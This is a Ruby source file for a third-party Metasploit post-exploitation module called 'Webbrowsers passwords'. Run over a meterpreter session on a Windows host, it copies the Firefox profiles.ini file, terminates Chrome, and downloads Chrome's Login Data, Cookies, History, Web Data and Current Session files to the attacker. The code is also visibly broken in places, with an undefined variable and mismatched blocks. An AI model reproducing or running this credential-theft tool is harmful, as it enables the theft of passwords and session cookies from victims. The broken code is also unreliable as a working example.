##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##




#########
require 'rex'
require 'msf/core'
require 'msf/core/post/common'
require 'msf/core/post/windows/priv'
require 'set'

#########
class MetasploitModule < Msf::Post
 
         include Msf::Post::File
         include Msf::Post::Common
         include Msf::Post::Windows::Priv

#########

def initialize(info = {})
    super(update_info(info,
      'Name'         => 'Webbrowsers passwords',
      'Description'  => %q{
        This module gets passwords from webbrowsers
      },
      'License'      => 'UNKNOWN_LICENSE',
      'Platform'     => ['win'],
      'SessionTypes' => ['meterpreter'],
      'Author'       => ['r00t-3xp10it, Milton@barra'],

    
	'DefaultOptions' =>
		{
		  'SESSION' => '1', # Default its to run againts session 1
                  'DOWNLOAD_PATH' => '/root', # default logs download location (local)
		}
        ))

    register_options(
      [
        OptBool.new('FIREFOX', [false, 'Get Firefox passwords', false]),
        OptBool.new('CHROME', [false, 'Get Google Chrome passwords', false]),
        OptString.new('SESSION', [ true, 'The session number to run this module on']),
        OptString.new('DOWNLOAD_PATH', [false, 'default logs download location (local)'])
      ], self.class)
    
end






# ------------------------
# DUMP DATA FROM FIREFOX
# -----------------------
def firefox_1

# variable declarations
profile =''
outpath = datastore['DOWNLOAD_PATH']
pth ="\"%appdata%\"\\Mozilla\\Firefox\\Profiles"
  # check for proper settings enter by user ...
  if datastore['FIREFOX'] == 'nil' || datastore['DOWNLOAD_PATH'] == 'nil'
    print_error("Please set FIREFOX | DOWNLOAD_PATH options...")
    print_line("")
    return
  else
    print_status("Gattering Firefox credentials...")
  end

    # check if file exist on target system
    if session.fs.file.exist?(path + "\\profiles.ini") # change the name of the file you want to check
      print_good("  firefox profiles.ini found...")
        # download file from target system
        client.fs.file.download("#{outpath}/profiles.ini","#{pth}\\profiles.ini")  # change the name of the file you want to download
        print_good("  Dumping credentials from target system...")
        print_warning("Credentials dump: #{outpath}/profiles.ini") # change the name of the file that you have downloaded
        # displays profile's directory names
        profile = client.fs.dir.entries(pth)
        print_status("Profile's directory: #{profile[2]}")
        print_line("")
    else 
      print_error("Firefox path not found.")
      return
    end
    rescue ::Exception => e
    print_error("Error Running Command: #{e.class} #{e}")
    print_line("")
end






# -----------------
# ?????????
# ---------------
def skip_process_name?(process_name)
    [
      '[system process]',
      'system'
    ].include?(process_name)
  end






# ------------------------------------------------
# if CHORME is set to true, run this piece of code
# ------------------------------------------------
def google_1

r=''
# variable declarations
outpath = datastore['DOWNLOAD_PATH']
sysnfo = session.sys.config.sysinfo
pathexe="\"%programfiles%\"\\Google\\Chrome\\Application\\chrome.exe"
datapath="%homepath%\\AppData\\Local\\Google\\Chrome\\\"User Data\"\\Default"

  # check for proper settings enter by user ...
  if datastore['CHROME'] == 'nil' || datastore['DOWNLOAD_PATH'] == 'nil'
    print_error("Please set CHROME | DOWNLOAD_PATH options...")
    return
  else
    print_status("Searching for Google Chrome path...")
    #check if chrome.exe exists
    if session.fs.file.exist?(pathexe)
      print_good("  Google Chrome directoy found...")
    else
      print_error("Google Chrome path not found.")
      print_line("")
      return
    end
  end


  #check if chrome.exe its running, if true terminate the process
  proc="chrome.exe"
  client.sys.process.get_processes().each do |x|
    next if skip_process_name?(x['name'].downcase)
      vprint_status("Checking #{x['name'].downcase} ...")
        if proc == (x['name'].downcase)
        print_status("Attempting to terminate '#{x['name']}' (PID: #{x['pid']}) ...")
        begin
          client.sys.process.kill(x['pid'])
          print_good("  #{x['name']} terminated.")
      end
  end
end
  


  # list of arrays to be executed
  creds = [
   'History',
   'Login Data',
   'Cookies',
   'Web Data',
   'Current Session'
  ]


  # loop funtion to download files from target system
  session.response_timeout=120 
    creds.each do |dump|
      r = client.fs.file.download("#{outpath}/#{sysnfo['Computer']}/#{dump}","#{datapath}\\#{dump}")
      print_good(" Downloading => #{dump}")

      # close client channel when done
      while(d = r.channel.read)
              break if d == ""
      end
    # error exception funtion
    rescue ::Exception => e
    print_error("Error Running Command: #{e.class} #{e}")
    print_error("  Error copying the file, try to see if Google Chrome its running on target machine.")
end






# -------------------
# MAIN MENU DISPLAYS
# -------------------
def run
   session = client
   sysnfo = session.sys.config.sysinfo

     print_line("")
     print_line("   ---------------------------------")
     print_line("   | Computer: #{sysnfo['Computer']}")
     print_line("   | OS: #{sysnfo['OS']}")
     print_line("   ---------------------------------")
     print_line("")
   
     #print_warning("just another color display...")
     #print_error("another color display...")
    if datastore['FIREFOX'] 
	  firefox_1 # jump to firefox funtion
    end	

    if datastore['CHROME']
          google_1 # jump to google chrome function
    end

  end
end
